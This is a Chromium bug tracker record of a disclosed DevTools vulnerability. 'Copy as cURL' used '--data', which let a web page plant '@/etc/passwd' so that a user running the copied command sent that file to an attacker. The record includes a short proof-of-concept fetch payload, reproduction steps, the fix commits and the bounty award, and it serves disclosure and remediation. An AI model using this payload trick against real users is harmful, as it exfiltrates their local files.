# Security: 'Copy As Curl' in the network panel of the devtools uses '--data' instead of '--data-raw', leading to arbitrary local file access

| Field | Value |
|-------|-------|
| **Issue ID** | [40051478](https://issues.chromium.org/issues/40051478) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Platform>DevTools>Network |
| **Platforms** | Linux, Mac, Windows, ChromeOS |
| **Reporter** | pe...@gmail.com |
| **Assignee** | ja...@chromium.org |
| **Created** | 2020-02-10 |
| **Bounty** | $500.00 |

## Description

**VULNERABILITY DETAILS**  

The chrome dev tools have a 'network' panel, where all the requests made by the current webpage are listed.  

In this panel, the user can right-click on a query, and then select 'Copy As cURL'.  

The issue is that the body of the request is passed to curl using '--data' instead of '--data-raw', allowing an attacker to include an user's local file in the request curl will make. Citing curl's man page :

```
          If  you start the data with the letter @, the rest should be a file name to read the data from, or - if you want curl to read the data from stdin. Multiple files can also be specified.  
          Posting data from a file named from a file like that, carriage returns and newlines will be stripped out. If you don't want the @ character to have a special interpretation use --data-raw instead.   

```

An attacker can use this bug to read local files on the computer of an user of the "Copy as curl" functionality. The only thing he has to do is making a request such as the following :

```
fetch('', {body:'@/etc/passwd', method:'POST', headers:{'Content-Type':'application/x-www-form-urlencoded'}})  

```

When the user will use 'copy as curl' on the generated request, and then execute the curl command, the contents of /etc/passwd will be sent to the attacker's server.

Fixing this bug is as simple as using --data-raw instead of --data in <https://github.com/ChromeDevTools/devtools-frontend/blob/0ed1d2b/front_end/network/NetworkLogView.js#L1952-L1956>

This bug is related to another bug I reported earlier: [crbug.com/1040080](https://crbug.com/1040080)

**VERSION**  

Tested on Chromium 79.0.3945.130

**REPRODUCTION CASE**

1. Serve the attached file over HTTP and open it in chrome
2. In the network development tools, right click the latest request and choose "copy as curl"
3. Paste the command you copied to a terminal and press enter

Expected result:  

The literal string '@/etc/passwd' is sent to the attacker's server

Actual result:  

The contents of the file /etc/passwd on the user's computer is sent to the attacker's server.

**CREDIT INFORMATION**  

Reporter credit: Ophir LOJKINE

## Attachments

- [bug.html](attachments/bug.html) (text/plain, 131 B)

## Timeline

### ca...@chromium.org (2020-02-10)

Triageing similarly to crbug.com/1040080.  janscheffler can you PTAL? Feel free to reassign as appropriate

### ca...@chromium.org (2020-02-10)

[Empty comment from Monorail migration]

[Monorail components: Platform>DevTools>Network]

### bm...@chromium.org (2020-02-11)

[Empty comment from Monorail migration]

### ja...@chromium.org (2020-02-11)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-02-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/d80e707a09e7615592a0e6f66fab3225fc28bbc3

commit d80e707a09e7615592a0e6f66fab3225fc28bbc3
Author: Jan Scheffler <janscheffler@chromium.org>
Date: Tue Feb 11 11:37:46 2020

[DevTools] Disable test to land change

Tbr: yangguo@chromium.org
Bug: chromium:1050756
Change-Id: Ieb0d3b0110e02373053900922e54112d05321dc8
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2049968
Auto-Submit: Jan Scheffler <janscheffler@chromium.org>
Reviewed-by: Yang Guo <yangguo@chromium.org>
Commit-Queue: Yang Guo <yangguo@chromium.org>
Cr-Commit-Position: refs/heads/master@{#740264}

[modify] https://crrev.com/d80e707a09e7615592a0e6f66fab3225fc28bbc3/third_party/blink/web_tests/TestExpectations


### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-02-11)

The following revision refers to this bug:
  https://chromium.googlesource.com/devtools/devtools-frontend/+/441bb6a89adeb9b8e77dee58ddc860ac07934054

commit 441bb6a89adeb9b8e77dee58ddc860ac07934054
Author: Jan Scheffler <janscheffler@chromium.org>
Date: Tue Feb 11 13:37:16 2020

Fix escaping for Copy as cURL

This cl changes the Copy as cURL implementation to use
--data-raw instead of --data.

Fixed: chromium:1050756
Change-Id: I0c8870dbb77d1d5396ccdc67bd8be5996de036f9
Reviewed-on: https://chromium-review.googlesource.com/c/devtools/devtools-frontend/+/2050227
Commit-Queue: Jan Scheffler <janscheffler@chromium.org>
Reviewed-by: Yang Guo <yangguo@chromium.org>
Reviewed-by: Sigurd Schneider <sigurds@chromium.org>

[modify] https://crrev.com/441bb6a89adeb9b8e77dee58ddc860ac07934054/front_end/network/NetworkLogView.js


### [Deleted User] (2020-02-15)

Setting Pri-2 to match security severity Low. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-02-15)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-02-17)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/7a736576f2cf8c11f26338f4c95e1143a8757fd9

commit 7a736576f2cf8c11f26338f4c95e1143a8757fd9
Author: Jan Scheffler <janscheffler@chromium.org>
Date: Mon Feb 17 14:03:51 2020

[DevTools] Update test expectations

CL with actual changes: crrev.com/c/2050227

Bug: chromium:1050756
Change-Id: Id0bb12f795730c2dd7d894f6a6777a7bd9b478f4
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/2049976
Commit-Queue: Jan Scheffler <janscheffler@chromium.org>
Reviewed-by: Yang Guo <yangguo@chromium.org>
Reviewed-by: Sigurd Schneider <sigurds@chromium.org>
Cr-Commit-Position: refs/heads/master@{#741908}

[modify] https://crrev.com/7a736576f2cf8c11f26338f4c95e1143a8757fd9/third_party/blink/web_tests/TestExpectations
[modify] https://crrev.com/7a736576f2cf8c11f26338f4c95e1143a8757fd9/third_party/blink/web_tests/http/tests/devtools/copy-network-request-expected.txt
[modify] https://crrev.com/7a736576f2cf8c11f26338f4c95e1143a8757fd9/third_party/blink/web_tests/http/tests/devtools/copy-network-request.js


### na...@google.com (2020-02-18)

[Empty comment from Monorail migration]

### na...@google.com (2020-02-20)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2020-02-20)

Congrats! The Panel decided to award $500 for this report 

### na...@google.com (2020-02-20)

[Empty comment from Monorail migration]

### ad...@google.com (2020-05-15)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-05-18)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-19)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@chromium.org (2020-05-21)

[Empty comment from Monorail migration]

### is...@google.com (2020-05-21)

This issue was migrated from crbug.com/chromium/1050756?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40051478)*
